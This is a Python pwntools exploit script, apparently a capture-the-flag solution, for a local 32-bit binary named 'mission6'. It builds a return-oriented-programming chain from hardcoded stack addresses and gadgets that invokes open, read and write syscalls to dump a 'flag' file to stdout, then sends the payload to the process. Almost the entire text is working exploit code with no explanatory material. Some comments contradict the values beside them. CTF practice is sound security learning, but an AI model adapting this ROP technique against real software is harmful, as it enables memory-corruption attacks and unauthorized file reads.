
from pwn import *

off =  0x40

ecx_val      = 0xffffcb38 + off
buffer_start = 0xffffc910 + off
rop_start    = 0xffffc918 + off

exploit = ""

def add_value(exploit, value):
	if value == 0:
		exploit += p32(1)
		exploit += p32(0xffffffff)
	else:
		exploit += p32(value - 1)
		exploit += p32(1)
	return exploit

flag_buff_start = buffer_start - 0x100

ebp = 0xffffc700

path_address = buffer_start
# /bin/cat\0
exploit = add_value(exploit, 0x67616c66) # flag
exploit = add_value(exploit, 0x0) # \0


# Open flag
exploit = add_value(exploit, 0x08048251) # popal ; cld ; ret
exploit = add_value(exploit, 0x0) # edi = 0
exploit = add_value(exploit, 0x0) # esi = 0
exploit = add_value(exploit, ebp) # ebp = 0
exploit = add_value(exploit, 0x0) # ? = 0 (MAYBE FLAGS)
exploit = add_value(exploit, path_address) # ebx = path
exploit = add_value(exploit, 0x0) # edx = 0
exploit = add_value(exploit, 0x0) # ecx = 0 = O_RDONLY
exploit = add_value(exploit, 0x5) # eax = 0x5

exploit = add_value(exploit, 0x080480ef) # int 0x80

predicted_eax = 0x3

exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage

# Read flag
exploit = add_value(exploit, 0x08048251) # popal ; cld ; ret
exploit = add_value(exploit, 0x0) # edi = 0
exploit = add_value(exploit, 0x0) # esi = 0
exploit = add_value(exploit, ebp) # ebp = 0
exploit = add_value(exploit, 0x0) # ? = 0 (MAYBE FLAGS)
exploit = add_value(exploit, predicted_eax) # ebx = result of open
exploit = add_value(exploit, 0x100) # edx = 0x100 size to read
exploit = add_value(exploit, flag_buff_start) # ecx = where we write the flag
exploit = add_value(exploit, 0x3) # eax = 0x3

exploit = add_value(exploit, 0x080480ef) # int 0x80

exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage
exploit = add_value(exploit, 0x1) # Garbage


# Write flag
exploit = add_value(exploit, 0x08048251) # popal ; cld ; ret
exploit = add_value(exploit, 0x0) # edi = 0
exploit = add_value(exploit, 0x0) # esi = 0
exploit = add_value(exploit, ebp) # ebp = 0
exploit = add_value(exploit, 0x0) # ? = 0 (MAYBE FLAGS)
exploit = add_value(exploit, 0x1) # ebx = 1 stdout
exploit = add_value(exploit, 0x100) # edx = 0x100 size to write
exploit = add_value(exploit, flag_buff_start) # ecx = where we write the flag
exploit = add_value(exploit, 0x4) # eax = 0x4

exploit = add_value(exploit, 0x080480ef) # int 0x80

filler_val = int((ecx_val - (buffer_start + len(exploit)))/4) + 100

for _ in range(filler_val):
	exploit = add_value(exploit, rop_start + 4)


with open("exploit.bin", "wb") as f:
	f.write(exploit)




p = process("../mission6")
p.send(exploit)
p.interactive()



